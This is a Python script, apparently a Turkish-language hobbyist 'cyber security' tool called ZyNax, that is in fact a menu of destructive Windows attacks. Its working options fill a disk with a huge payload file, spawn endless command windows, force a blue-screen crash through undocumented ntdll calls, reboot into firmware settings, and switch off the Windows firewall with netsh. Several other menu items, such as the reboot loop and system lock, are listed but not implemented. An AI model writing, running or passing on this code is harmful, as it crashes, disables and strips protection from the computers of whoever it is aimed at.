import os
import sys
import time
import ctypes
import threading
import json
import platform
from urllib.request import urlopen

# --- RENK PALETİ ---
R, G, Y, B, C, W, RES = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[96m", "\033[97m", "\033[0m"
os.system("") 

def temizle():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- GİRİŞ EKRANI ---
def giris_ekrani():
    temizle()
    print(f"{R} [!] ZYNAX MODÜLLERİ YÜKLENİYOR...{RES}")
    time.sleep(0.5)
    print(f"\n\t\t{R}╔══════════════════════════════════════════════╗")
    print(f"\t\t║          !!! ZYNAX SİBER GÜVENLİK !!!        ║")
    print(f"\t\t║               YAPIMCI: YUSUF                 ║")
    print(f"\t\t╚══════════════════════════════════════════════╝{RES}")
    print(f"\n\t\t{Y}⚠️  DİKKAT: TÜM SORUMLULUK KULLANICIYA AİTTİR.{RES}")
    time.sleep(1)

# --- [02] DEPOLAMA BOMBASI (ÖZELLEŞTİRİLMİŞ - DOKUNULMAZ) ---
def disk_bombasi():
    temizle()
    print(f"{R}—"*65 + f"\n\t[!!!] 💣 DİSK BOMBARDIMANI (ÖZEL BOYUT) 💣 [!!!]\n" + "—"*65 + f"{RES}")
    try:
        yol_input = input(f"\n{C}[?] Hedef Klasör Yolu ('m' = Masaüstü): {RES}").strip()
        if yol_input.lower() == 'm':
            yol = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'zynax_payload.dat')
        else:
            yol = os.path.join(yol_input, 'zynax_payload.dat') if os.path.isdir(yol_input) else yol_input
        
        birim = input(f"{Y}[?] Boyut birimi (mb / gb): {RES}").lower()
        miktar = int(input(f"{Y}[?] Miktar girin: {RES}"))
        boyut = miktar * 1024 * 1024 if birim == "mb" else miktar * 1024 * 1024 * 1024

        print(f"\n{B}[*] Hedef: {yol}")
        with open(yol, "wb") as f:
            f.seek(boyut - 1)
            f.write(b"\0")
        
        for i in range(1, 11):
            print(f"{R}[!] YAZILIYOR: %{i*10}{RES}", end="\r")
            time.sleep(0.1)
        print(f"\n\n{G}[+] BAŞARILI! Yusuf Payload Dosyası Oluşturuldu.{RES}")
    except Exception as e: print(f"{R}[X] Hata: {e}{RES}")
    input(f"\n{W}Ana menüye dönmek için ENTER...{RES}")

# --- [07] SINIRSIZ PENCERE ---
def sonsuz_pencere():
    temizle()
    print(f"{R}[!!!] SINIRSIZ PENCERE AKTİF! DURDURMAK İÇİN PC'Yİ KAPAT!{RES}")
    time.sleep(1)
    while True:
        os.system("start cmd.exe")

# --- ANA MENÜ ---
def ana_menu():
    temizle()
    # GENİŞ VE KIRMIZI ZYNAX LOGOSU
    print(f"""{R}
 ███████╗██╗   ██╗███╗   ██╗ █████╗ ██╗  ██╗
 ╚══███╔╝╚██╗ ██╔╝████╗  ██║██╔══██╗╚██╗██╔╝
   ███╔╝  ╚████╔╝ ██╔██╗ ██║███████║ ╚███╔╝ 
  ███╔╝    ╚██╔╝  ██║╚██╗██║██╔══██║ ██╔██╗ 
 ███████╗   ██║   ██║ ╚████║██║  ██║██╔╝ ██╗
 ╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ v190
    {RES}""")
    
    print(f"\t{R}[!]{G} ZyNax{Y} v190{B} |{C} Yapımcı: {W}Yusuf{RES}")
    print(f"{C}—"*70 + f"{RES}")
    print(f" [01] {Y}🔍 IP / SİSTEM ANALİZİ{RES}        [07] {R}🖼️  SINIRSIZ PENCERE BOMBASI{RES}")
    print(f" [02] {Y}💣 DİSK BOMBACISI (ÖZEL){RES}       [08] {R}🛡️  GÜVENLİK DUVARI KAPAT{RES}")
    print(f" [03] {R}💻 MAVİ EKRAN (BSOD){RES}           [09] {R}🔒 SİSTEMİ KİLİTLE (PARALYZE){RES}")
    print(f" [04] {R}⚠️  SİSTEMİ SIFIRLA (HARD){RES}      [10] {R}🔄 SONSUZ REBOOT DÖNGÜSÜ{RES}")
    print(f" [05] {B}⚡ YENİDEN BAŞLATMA{RES}            [11] {C}🚪 PROGRAMDAN GÜVENLİ ÇIKIŞ{RES}")
    print(f" [06] {C}⚙️  BIOS AYARLARINA ZORLA{RES}        {W}-------------------------{RES}")
    print(f"{C}—"*70 + f"{RES}")

    secim = input(f"\n {B}ZyNax_YUSUF > {RES}")

    if secim == "1":
        try:
            d = json.loads(urlopen("http://ip-api.com/json/").read().decode())
            print(f"\n{G}IP: {d.get('query')} | Şehir: {d.get('city')}{RES}")
        except: print("Bağlantı yok.")
        input("\nDevam..."); ana_menu()

    elif secim == "2":
        disk_bombasi()
        ana_menu()

    elif secim == "3":
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        except:
            print("SAĞ TIKLA -> YÖNETİCİ OLARAK ÇALIŞTIR!")
            time.sleep(2); ana_menu()

    elif secim == "6": os.system("shutdown /r /fw /t 0")
    elif secim == "7": sonsuz_pencere()
    elif secim == "8": os.system("netsh advfirewall set allprofiles state off"); ana_menu()
    elif secim == "11": sys.exit()
    else: ana_menu()

if __name__ == "__main__":
    giris_ekrani()
    ana_menu()
